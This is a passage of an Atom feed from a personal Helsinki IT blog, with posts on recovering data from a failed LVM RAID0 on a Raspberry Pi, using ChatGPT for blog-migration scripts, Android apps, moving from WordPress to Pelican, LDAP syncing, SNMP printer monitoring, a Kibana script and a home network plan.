<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>There is IT in Helsinki - it</title><link href="/" rel="alternate"></link><link href="/it.atom.xml" rel="self"></link><id>/</id><updated>2023-06-13T22:03:00+03:00</updated><entry><title>Raspberry Pi 4 with external SSDs</title><link href="/raspberry-pi-4-with-external-ssds.html" rel="alternate"></link><published>2023-06-13T22:03:00+03:00</published><updated>2023-06-13T22:03:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2023-06-13:/raspberry-pi-4-with-external-ssds.html</id><summary type="html">&lt;h2 id="why-this-exercise"&gt;Why This Exercise?&lt;/h2&gt;
&lt;p&gt;Before this post I had an old mini-itx server with ssds at home. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a 120GB, 4TB and a 2TB SSD all from Samsung, and one fourth 1TB now broken/missing one device that doesn't power on anymore :/. &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This really shouldn't have been an issue but I didn't …&lt;/p&gt;</summary><content type="html">&lt;h2 id="why-this-exercise"&gt;Why This Exercise?&lt;/h2&gt;
&lt;p&gt;Before this post I had an old mini-itx server with ssds at home. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a 120GB, 4TB and a 2TB SSD all from Samsung, and one fourth 1TB now broken/missing one device that doesn't power on anymore :/. &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This really shouldn't have been an issue but I didn't want to do RAID1 because the data wasn't that important to me and I had added them into an LVM RAID0 instead.&lt;/p&gt;
&lt;p&gt;Fortunately I don't remember exactly what I did with the 1TB storage device, maybe I wasn't using it anymore but it was still part of the LVM VG? Anyway, files couldn't be read and there were some corrupted sqlites.&lt;/p&gt;
&lt;h2 id="what"&gt;What&lt;/h2&gt;
&lt;p&gt;I first looked around for some cheap NAS boxes to put the SSDs in. No avail and definately not cheap.&lt;/p&gt;
&lt;p&gt;Then I looked behind my monitor on my desk and saw an unused raspberry pi 4 with 8GB RAM.&lt;/p&gt;
&lt;p&gt;Huh. Can I?&lt;/p&gt;
&lt;p&gt;Insert research to find some good posts &lt;a href="https://thepihut.com/blogs/raspberry-pi-tutorials/how-to-set-up-an-ssd-with-the-raspberry-pi"&gt;like this&lt;/a&gt;  from thepihut.&lt;/p&gt;
&lt;p&gt;It also had some link to a cable but unfortunately I couldn't order it. Maybe my card doesn't work outside EU?&lt;/p&gt;
&lt;h2 id="next"&gt;Next&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;before powering off the old server I vgexported the LVM&lt;/li&gt;
&lt;li&gt;usb active plus right SATA to USB cables with controller? That RPI 4 likes.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.startech.com/en-us/hdd/usb312sat3cb"&gt;startech&lt;/a&gt; had some overpowered 10Gb cables&lt;/li&gt;
&lt;li&gt;firmware for the cable was not needed to update&lt;/li&gt;
&lt;li&gt;Why was i Lazy with the lvm raid0 stripe lol of course first disk dies&lt;/li&gt;
&lt;li&gt;always running out of more power extension at home, but now I think we're OK again&lt;/li&gt;
&lt;li&gt;Got an Active USB hub from TPlink(TP-LINK UH720 active 7-port USB3.0) (needed because the RPi4 cannot power these disks)&lt;/li&gt;
&lt;li&gt;Doesn't exactly match the 3.1 USB of the USB to SATA cables.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="i-tried-to-recover-some-of-the-data-just-for-the-practice"&gt;I tried to recover some of the data just for the practice&lt;/h3&gt;
&lt;p&gt;After plugging in both disks via the active hub:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;vgs&lt;/code&gt; finds it!&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vgchange -ay vg_data --activationmode partial&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;1 LV activated!&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mount -t /dev/vg_data/lv_data /mnt/recovery -o ro&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;works! And just tried to copy one image out and that worked woop! 2.8TB used with 3.4T free.&lt;/li&gt;
&lt;li&gt;now what, get another 4TB disk and copy stuff there then juggle stuff around?&lt;/li&gt;
&lt;li&gt;mount as rw and delete data until it's &amp;lt; 2TB &lt;ul&gt;
&lt;li&gt;possibly risky?&lt;/li&gt;
&lt;li&gt;did it anyway and it had "mounting fs with errors" in &lt;code&gt;dmesg&lt;/code&gt; output&lt;/li&gt;
&lt;li&gt;du has input/output errors to parts of this, but not the whole thing&lt;/li&gt;
&lt;li&gt;started to delete stuff&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Make sure all data is on the 2TB PV sounds like a good idea&lt;/li&gt;
&lt;li&gt;Remove 4TB PV from VG &lt;code&gt;vgsplit&lt;/code&gt;  or &lt;code&gt;vgreduce&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;tried vgreduce - wasn't happy &lt;/li&gt;
&lt;li&gt;wanted a vgreduce with --removemissing but that complained about partial LVs in the VG&lt;/li&gt;
&lt;li&gt;Maybe just easier to copy stuff out I want to save and then start from scratch?&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Create a new LVM with the 4TB then move stuff there&lt;/li&gt;
&lt;li&gt;Then create another VG with the 2TB and put some other stuff there?&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="in-the-end"&gt;In the end&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Copied stuff out from the rpi4 into my desktop which had a few 100GB free on a disk.&lt;/li&gt;
&lt;li&gt;Then wiped out the LVM on the two SSDs and created some new setup.&lt;/li&gt;
&lt;/ul&gt;</content><category term="it"></category><category term="it"></category><category term="ssd"></category><category term="rpi"></category><category term="raspberry pi"></category><category term="raspberry pi 4"></category><category term="sata"></category><category term="usb"></category></entry><entry><title>Using Chat GPT or other LLM at for hobby projects</title><link href="/using-chat-gpt-or-other-llm-at-for-hobby-projects.html" rel="alternate"></link><published>2023-04-20T22:03:00+03:00</published><updated>2023-04-20T22:03:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2023-04-20:/using-chat-gpt-or-other-llm-at-for-hobby-projects.html</id><summary type="html">&lt;p&gt;I find myself using chatGPT or similar like &lt;a href="https://www.phind.com/"&gt;phind&lt;/a&gt; recently to help with some computer programming tasks.&lt;/p&gt;
&lt;p&gt;I'll probably post more about what I'm using it for at work too.&lt;/p&gt;
&lt;p&gt;It's a thing that's up-and-coming so seems like something useful I could learn!&lt;/p&gt;
&lt;h2 id="some-reasons-why-i-used-it-during-the-migration-of-this-blog-post-from-jekyll-to-pelica"&gt;Some reasons why I used it during …&lt;/h2&gt;</summary><content type="html">&lt;p&gt;I find myself using chatGPT or similar like &lt;a href="https://www.phind.com/"&gt;phind&lt;/a&gt; recently to help with some computer programming tasks.&lt;/p&gt;
&lt;p&gt;I'll probably post more about what I'm using it for at work too.&lt;/p&gt;
&lt;p&gt;It's a thing that's up-and-coming so seems like something useful I could learn!&lt;/p&gt;
&lt;h2 id="some-reasons-why-i-used-it-during-the-migration-of-this-blog-post-from-jekyll-to-pelica"&gt;Some reasons why I used it during the migration of this blog post from jekyll to pelica:&lt;/h2&gt;
&lt;p&gt;I had some real needs where I maybe didn't want to write the whole script from scratch, or I thought I could get there quicker by making a few tweaks and instead ask for one of these bots? to make the first attempt for me.&lt;/p&gt;
&lt;p&gt;First was a:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;python script that recursively loops through all .md files inside a folder called "posts" and creates symlinks to all those files inside a single directory called "content"&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;this worked quite well, but I needed to refine the script a few times by adding exception handling and creating directories:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;adding follow-ups like "The symlink should not have any directories in them, just the filename."&lt;/li&gt;
&lt;li&gt;'the symlink need to have a ".." in the path' because the symlinks weren't working for me&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Another was to help with some changes like:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;use python re.findall to replace all http://guldmyr.com with https://guldmyr.com&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="as-part-of-testing-the-site"&gt;As part of testing the site:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;a python script that crawls a single url front page only and exits with non-zero return code if there are any broken links&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Turning the yaml lists in all the blog posts into a comma separated one I need to clarify a few times:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I have hundreds of these files. I want to modify the files not make new files.&lt;/li&gt;
&lt;li&gt;The files have *.md file extension and are not 100% yaml so cannot be loaded.&lt;/li&gt;
&lt;li&gt;Can you make it look recursively for md files too?&lt;/li&gt;
&lt;li&gt;The elements in the list are quoted with double quotes, can we strip those too?&lt;/li&gt;
&lt;li&gt;re.error: unbalanced parenthesis at position 537 (line 12, column 117)&lt;/li&gt;
&lt;li&gt;This is tried to fix. But in the end the error was a bad blog post that looked too closely like yaml??&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And in the end I needed to remove some double-quotes around the tags so rather than typing&lt;/p&gt;
&lt;p&gt;"in bash Remove double quotes from any .md files recursively for lines that start with categories: or tags:"&lt;/p&gt;
&lt;p&gt;It returned this pretty quickly, which I TBH could have figured out myself :)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;find&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;md&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;type&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;exec&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;sed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;/^&lt;/span&gt;&lt;span class="nx"&gt;categories&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;//g&amp;#39; {} +&lt;/span&gt;
&lt;span class="s"&gt;find . -name &amp;#39;*.md&amp;#39; -type f -exec sed -i &amp;#39;/^tags:/ s/&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;//g&amp;#39; {} +&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="formatting"&gt;Formatting&lt;/h2&gt;
&lt;p&gt;I had a blog post which used poor syntax and stuff was all in a single line. So I pasted the thing to it and asked it to create a bash script out of it (basically figure out where the newlines should be). Worked very nicely :D&lt;/p&gt;</content><category term="it"></category><category term="it"></category><category term="llm"></category><category term="chatgpt"></category><category term="phind"></category></entry><entry><title>Great Android Apps 2023</title><link href="/great-android-apps-2023.html" rel="alternate"></link><published>2023-04-20T00:00:00+03:00</published><updated>2023-04-20T00:00:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2023-04-20:/great-android-apps-2023.html</id><summary type="html">&lt;h1 id="are-you-ready-to-take-your-android-experience-to-the-next-level-then-buckle-up-and-get-ready-to-discover-some-of-the-best-android-apps-of-2023"&gt;Are you ready to take your Android experience to the next level? Then buckle up and get ready to discover some of the best Android apps of 2023!&lt;/h1&gt;
&lt;p&gt;We all remember the days of using clunky task killers and relying on third-party apps to perform basic functions on our phones …&lt;/p&gt;</summary><content type="html">&lt;h1 id="are-you-ready-to-take-your-android-experience-to-the-next-level-then-buckle-up-and-get-ready-to-discover-some-of-the-best-android-apps-of-2023"&gt;Are you ready to take your Android experience to the next level? Then buckle up and get ready to discover some of the best Android apps of 2023!&lt;/h1&gt;
&lt;p&gt;We all remember the days of using clunky task killers and relying on third-party apps to perform basic functions on our phones. But now, things have changed, and Android is better than ever. In fact, some of the apps we once relied on have become obsolete as Android has improved its own features.&lt;/p&gt;
&lt;p&gt;But fear not, there are still plenty of amazing apps out there that can enhance your Android experience. Let's dive in and take a look at some of the best apps for Android in 2023!&lt;/p&gt;
&lt;p&gt;First up, we have Guitartuna, the ultimate app for tuning your guitar, bass, or ukulele. Whether you're a seasoned musician or just starting out, Guitartuna makes tuning your instrument a breeze.&lt;/p&gt;
&lt;p&gt;Next on our list is Simple ABP Free, an incredible audio book player that makes listening to your favorite books a joy. With a sleek and intuitive interface, Simple ABP Free is the perfect way to enjoy your favorite books on the go.&lt;/p&gt;
&lt;p&gt;If you're a fan of keeping up with the latest news and trends, then you'll love inoreader. This powerful RSS reader makes it easy to stay on top of all the latest news and stories from your favorite sources.&lt;/p&gt;
&lt;p&gt;And of course, we can't forget about the classics like Spotify and Google Keep. These apps have been around for years, but they continue to be some of the most popular and useful apps out there.&lt;/p&gt;
&lt;p&gt;But that's not all! There are plenty of other amazing apps out there, like chat apps such as keybase.io, wine and beer tracking apps like vivino and untappd, and even vocabulary training apps like ankdroid.&lt;/p&gt;
&lt;p&gt;And for those of you who love to tinker with your phone, don't miss out on fdroid&amp;amp;termux, a powerful combination that gives you a great terminal experience on your Android device.&lt;/p&gt;
&lt;p&gt;So what are you waiting for? Head to the Google Play Store and start downloading these amazing apps today!&lt;/p&gt;
&lt;p&gt;My phone is a Samsung and I no longer have a tablet like in &lt;a href="https://guldmyr.com/great-android-apps"&gt;2013&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id="to-compare-in-2013-i-liked"&gt;To compare, in 2013 I liked:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;a flashlight&lt;/li&gt;
&lt;li&gt;mybookdroid&lt;/li&gt;
&lt;li&gt;goodreads&lt;/li&gt;
&lt;li&gt;andropas&lt;/li&gt;
&lt;li&gt;realcalc&lt;/li&gt;
&lt;li&gt;irssi stuff&lt;/li&gt;
&lt;li&gt;some different launcher&lt;/li&gt;
&lt;li&gt;a task killer..&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="in-2023"&gt;In 2023:&lt;/h2&gt;
&lt;p&gt;My phone is a Samsung and I no longer have a tablet like in &lt;a href="https://guldmyr.com/great-android-apps"&gt;2013&lt;/a&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;flashlight is built-in&lt;/li&gt;
&lt;li&gt;I just use goodreads - not scanning any books :)&lt;/li&gt;
&lt;li&gt;and mostly use stuff from the browser&lt;/li&gt;
&lt;li&gt;the local public transport company app &lt;a href="https://play.google.com/store/apps/details?id=fi.hsl.app"&gt;HSL&lt;/a&gt; is pretty good&lt;/li&gt;
&lt;li&gt;i don't calculate&lt;/li&gt;
&lt;li&gt;but I use pushbullet!&lt;/li&gt;
&lt;li&gt;default launcher and no task killer in use, but I think that's because the one inside android is pretty good now no?&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="links"&gt;Links&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.ovelin.guitartuna"&gt;Guitartuna&lt;/a&gt; for tuning guitar/bass/ukulele&lt;/li&gt;
&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=mdmt.sabp.free"&gt;Simple ABP Free&lt;/a&gt; really good audio book player&lt;/li&gt;
&lt;li&gt;&lt;a href="https://inoreader.com/"&gt;inoreader&lt;/a&gt; For that RSS juice&lt;/li&gt;
&lt;li&gt;spotify &lt;/li&gt;
&lt;li&gt;google keep&lt;/li&gt;
&lt;li&gt;all kinds of chat stuff like keybase.io&lt;/li&gt;
&lt;li&gt;vivino/untappd&lt;/li&gt;
&lt;li&gt;ankdroid (supposedly good for training / vocabulary, but I never had the patience for it to do it consistently)&lt;/li&gt;
&lt;li&gt;fdroid&amp;amp;&lt;a href="https://f-droid.org/packages/com.termux/"&gt;termux&lt;/a&gt; so nice to have a good terminal in the phone sometimes&lt;/li&gt;
&lt;/ul&gt;</content><category term="it"></category><category term="android"></category><category term="apps"></category><category term="it"></category></entry><entry><title>Moving from WordPress to This</title><link href="/moving-from-wordpress-to-this.html" rel="alternate"></link><published>2023-04-15T21:57:00+03:00</published><updated>2023-04-15T21:57:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2023-04-15:/moving-from-wordpress-to-this.html</id><summary type="html">&lt;h1 id="background-story"&gt;Background Story&lt;/h1&gt;
&lt;p&gt;I had this great webhost.&lt;/p&gt;
&lt;p&gt;They had the first &lt;code&gt;$SHELL&lt;/code&gt; I ever used. I learnt a lot about bash scripting there. I ran eggdrops and IRC clients and used screen :D&lt;/p&gt;
&lt;p&gt;I experienced the hacks when they got pwned, because those things happened back then (2001-2002 probably).&lt;/p&gt;
&lt;p&gt;Anyway …&lt;/p&gt;</summary><content type="html">&lt;h1 id="background-story"&gt;Background Story&lt;/h1&gt;
&lt;p&gt;I had this great webhost.&lt;/p&gt;
&lt;p&gt;They had the first &lt;code&gt;$SHELL&lt;/code&gt; I ever used. I learnt a lot about bash scripting there. I ran eggdrops and IRC clients and used screen :D&lt;/p&gt;
&lt;p&gt;I experienced the hacks when they got pwned, because those things happened back then (2001-2002 probably).&lt;/p&gt;
&lt;p&gt;Anyway, eventually I also had some websites with them and this blog used to live there in a wordpress.&lt;/p&gt;
&lt;p&gt;Until the other day when I think wordpress had gotten auto-updated beyond the now quite old PHP version.&lt;/p&gt;
&lt;h1 id="lets-try-jekyll-they-say"&gt;Let's try Jekyll They Say&lt;/h1&gt;
&lt;p&gt;First I thought: hey how can I keep on paying very little money for this? Is exporting and importing the wordpress somewhere that? No. At least not on this one web hotell I checked :)&lt;/p&gt;
&lt;p&gt;Then I thought: hmm how hard is it to export the wordpress into static MD files and server those somewhere? (Turns out not so hard)&lt;/p&gt;
&lt;p&gt;Third: Let's try to use GitHub Pages because that's where I'd like to keep the code anyway?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Changed nameserver to a service and then pointed guldmyr.com to github pages.&lt;/li&gt;
&lt;li&gt;What pages to use? Uhhh.. jekyll??&lt;/li&gt;
&lt;li&gt;Lots of fighting and it looked quite bad.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Fourth: Let's not use Ruby because I can't.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cloudflare also looks cool and I'd like some experience with that&lt;/li&gt;
&lt;li&gt;Cloudflare has pages too?&lt;/li&gt;
&lt;li&gt;It has support for some Python framework called Pelican!&lt;/li&gt;
&lt;li&gt;To use Cloudflare pages and get guldmyr.com and not just www.guldmyr.com here I need to move my DNS to them :/&lt;/li&gt;
&lt;li&gt;Cloudflare has free DNS? Why did I pay a yearly thing in advance???&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Anyway, here we are and I'm quite happy with this pelican and cloudflare thing. A few things I found annoying with GitHub Pages:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It took I kid you not 16min for jekyll to render the html from the markdown of this blog.&lt;/li&gt;
&lt;li&gt;No preview built-in so I broke the website several times.&lt;/li&gt;
&lt;li&gt;And because (Rust?) I couldn't easily figure out how to jekyll on my local machine.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Are now much better with Pelican. And because it's python if I need to modify something it is often relatively easy for me. OK we are missing some things. There's no search options. For which I'm glad I've been adding lots of tags on posts over the years. So yeah. Poor man's search is now the &lt;a href="tags/"&gt;tags&lt;/a&gt; page!&lt;/p&gt;
&lt;p&gt;Anyway. Welcome to the blog. Let's see how long until the next post :D&lt;/p&gt;</content><category term="it"></category><category term="blog"></category><category term="wordpress"></category><category term="jekyll"></category><category term="pelican"></category><category term="cloudflare"></category><category term="dns"></category><category term="linux"></category><category term="web hosting"></category></entry><entry><title>LSC - LDAP Synchronization Connector</title><link href="/lsc-ldap-synchronization-connector.html" rel="alternate"></link><published>2021-09-28T00:00:00+03:00</published><updated>2021-09-28T00:00:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2021-09-28:/lsc-ldap-synchronization-connector.html</id><summary type="html">&lt;p&gt;At $dayjob I recently found this tool.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://lsc-project.org/doku.php"&gt;https://lsc-project.org/doku.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Use case was a workaround to get our good old posixGroups into groupOfNames; because some tools like bitwarden on premise requires that members of the groups are DNs for them to be able to figure out who's member …&lt;/p&gt;</summary><content type="html">&lt;p&gt;At $dayjob I recently found this tool.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://lsc-project.org/doku.php"&gt;https://lsc-project.org/doku.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Use case was a workaround to get our good old posixGroups into groupOfNames; because some tools like bitwarden on premise requires that members of the groups are DNs for them to be able to figure out who's member of what group.&lt;/p&gt;
&lt;p&gt;Got it working pretty nicely after &lt;a href="https://lsc-project.org/documentation/tutorial/synchronizeposixgroupstogroupofnames"&gt;learning&lt;/a&gt; some fun things like:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;settings in the lsc.xml have to be in the correct order&lt;/li&gt;
&lt;li&gt;Connection settings in &lt;a href="https://lsc-project.org/documentation/2.0/configuration/connections/ldap"&gt;documentation&lt;/a&gt; listed as mandatory, are not mandatory (as in don't have to be explicitly defined in the lsc.xml).&lt;/li&gt;
&lt;li&gt;LSC 2.1 requires java8 :(&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;För monitoring it, I opted to parse the output of the tool rather than reading the log file. There's a nice logback.xml one probably could use to improve this bit. Maybe somehow log to JSON or some such to get machine readable output?&lt;/p&gt;</content><category term="it"></category><category term="java"></category><category term="ldap"></category><category term="sync"></category><category term="synchronization"></category></entry><entry><title>Prometheus and SNMP from a printer</title><link href="/prometheus-and-snmp-from-a-printer.html" rel="alternate"></link><published>2021-04-07T00:00:00+03:00</published><updated>2021-04-07T00:00:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2021-04-07:/prometheus-and-snmp-from-a-printer.html</id><summary type="html">&lt;p&gt;The other week I finally for this thing working I've been trying weakly to do every now and then when I had a few minutes free: send an alert before a toner runs out in a printer!&lt;/p&gt;
&lt;p&gt;Way back I set up &lt;a href="https://github.com/prometheus/snmp_exporter"&gt;SNMP_exporter&lt;/a&gt; to fetch metrics from switches. This worked …&lt;/p&gt;</summary><content type="html">&lt;p&gt;The other week I finally for this thing working I've been trying weakly to do every now and then when I had a few minutes free: send an alert before a toner runs out in a printer!&lt;/p&gt;
&lt;p&gt;Way back I set up &lt;a href="https://github.com/prometheus/snmp_exporter"&gt;SNMP_exporter&lt;/a&gt; to fetch metrics from switches. This worked very nicely. ( In retrospect this works nicely because it's the default type of device )&lt;/p&gt;
&lt;p&gt;But for printers we didn't get much useful data out. Even though we use the vanilla upstream &lt;a href="https://github.com/prometheus/snmp_exporter/blob/main/snmp.yml"&gt;snmp.yml&lt;/a&gt; which has printer stuff in it. And when I did an snmpwalk I did manage with some research to find the correct OIDs to query to get the level of ink in the toners. So I knew the printer did publish the information I was looking for.&lt;/p&gt;
&lt;p&gt;The answer? Select a &lt;strong&gt;module&lt;/strong&gt; when sending the request to the exporter! I didn't select &lt;strong&gt;printer_mib&lt;/strong&gt; so it used if_mib that only has interface statistics.&lt;/p&gt;
&lt;p&gt;What would have helped? Not suing the vanilla (large) snmp.yml and only use a custom one that has the data we wanted..&lt;/p&gt;
&lt;p&gt;Printers are no fun :/&lt;/p&gt;
&lt;p&gt;Prometheus is!&lt;/p&gt;</content><category term="it"></category><category term="monitoring"></category><category term="printer"></category><category term="prometheus"></category><category term="snmp"></category></entry><entry><title>Convert a string to integer in Kibana with painless</title><link href="/convert-a-string-to-integer-in-kibana-with-painless.html" rel="alternate"></link><published>2020-12-16T00:00:00+02:00</published><updated>2020-12-16T00:00:00+02:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2020-12-16:/convert-a-string-to-integer-in-kibana-with-painless.html</id><summary type="html">&lt;p&gt;if (doc['bytes.keyword'].size()!=0) {
    return Integer.parseInt(doc['bytes.keyword'].value)
}&lt;/p&gt;
&lt;p&gt;This took me a while to figure out!&lt;/p&gt;
&lt;p&gt;The above only works for Integer (so no 1.1 or 2.22).&lt;/p&gt;
&lt;p&gt;It works on ELK 7.10&lt;/p&gt;
&lt;p&gt;I needed it because I'm using %{COMBINEDAPACHELOG} GROK pattern.&lt;/p&gt;
&lt;p&gt;That …&lt;/p&gt;</summary><content type="html">&lt;p&gt;if (doc['bytes.keyword'].size()!=0) {
    return Integer.parseInt(doc['bytes.keyword'].value)
}&lt;/p&gt;
&lt;p&gt;This took me a while to figure out!&lt;/p&gt;
&lt;p&gt;The above only works for Integer (so no 1.1 or 2.22).&lt;/p&gt;
&lt;p&gt;It works on ELK 7.10&lt;/p&gt;
&lt;p&gt;I needed it because I'm using %{COMBINEDAPACHELOG} GROK pattern.&lt;/p&gt;
&lt;p&gt;That GROK pattern is built-in with logstash and just says NUMBER:bytes and number is (?:%{BASE10NUM})&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/logstash-plugins/logstash-patterns-core/blob/master/patterns/httpd#L5"&gt;https://github.com/logstash-plugins/logstash-patterns-core/blob/master/patterns/httpd#L5&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;There's actually a way to specify in the grok pattern that it's an integer:&lt;/p&gt;
&lt;p&gt;%{NUMBER:field:integer}&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/logstash-plugins/logstash-patterns-core/issues/173"&gt;https://github.com/logstash-plugins/logstash-patterns-core/issues/173&lt;/a&gt; is an open issue from 2016 about this issue.&lt;/p&gt;
&lt;p&gt;I guess what I should do is just make my own pattern with this fixed where I want it... I would really like to not fiddle with templates or add logstash mutate rules..&lt;/p&gt;</content><category term="it"></category></entry><entry><title>New Home Network Plan!</title><link href="/new-home-network-plan.html" rel="alternate"></link><published>2020-07-05T00:00:00+03:00</published><updated>2020-07-05T00:00:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2020-07-05:/new-home-network-plan.html</id><summary type="html">&lt;p&gt;Changing apartment again so a pretty decent time to change the network at home.&lt;/p&gt;
&lt;p&gt;Doing it a bit on the cheap this time around.&lt;/p&gt;
&lt;p&gt;We'll get a docsis cable connection. Fortunately I have a modem used to connect to the same ISP from a previous apartment. Unfortunately the modem was …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Changing apartment again so a pretty decent time to change the network at home.&lt;/p&gt;
&lt;p&gt;Doing it a bit on the cheap this time around.&lt;/p&gt;
&lt;p&gt;We'll get a docsis cable connection. Fortunately I have a modem used to connect to the same ISP from a previous apartment. Unfortunately the modem was a &lt;strong&gt;&lt;em&gt;bit shit.&lt;/em&gt;&lt;/strong&gt; Or it used to reboot or need a reboot every now and then.&lt;/p&gt;
&lt;p&gt;The plan is now to put the modem into &lt;strong&gt;bridge mode&lt;/strong&gt; and move the brains into two other devices.&lt;/p&gt;
&lt;p&gt;First device: A &lt;strong&gt;Raspberry&lt;/strong&gt; Pi 3B with openwrt installed. It'll have an extra Realtek 8153 1Gbps USB port.&lt;/p&gt;
&lt;p&gt;Internal NIC 100Mbps goes to LAN and will have DHCP Server. The external will have the WAN connection. The RPI 3b also has a WiFi, but it's only 2.4GHz so we'll only use that for local admin access.&lt;/p&gt;
&lt;p&gt;Second device is a &lt;strong&gt;&lt;a href="https://www.guldmyr.com/air-lap1142n-e-k9-to-autonomous-mode-adventure/"&gt;Cisco AP&lt;/a&gt;&lt;/strong&gt; that I blogged about not too long ago. That can do 5GHz :) This hasn't been used but I set it up so I can just plug it into an L2 with a DHCP and it should just work.&lt;/p&gt;
&lt;p&gt;Will also use an unmanaged switch to connect stuff on the LAN.&lt;/p&gt;
&lt;p&gt;One nice thing with the current apartment is the Ethernet in all rooms. New one might only have one cable TV/antenna port. Hoping for more. I'd rather not have to use some Ethernet over Power as there's also a media server to connect onto the LAN or wifi near the Chromecast.. sometimes it's nice to not throw everything away. Thought I had thrown away the cable modem too, but turns out I hadn't. New one is 180€ and used ones seems to go quite quickly on second hand marketplaces.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update0&lt;/strong&gt;: after move! All worked on the first power on - yay!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update1&lt;/strong&gt;: Not so yay - no WiFi reception one floor up as far as possible (15m?) from the AP. Hmmm. Maybe need to just put the AP in a more central spot.&lt;/p&gt;
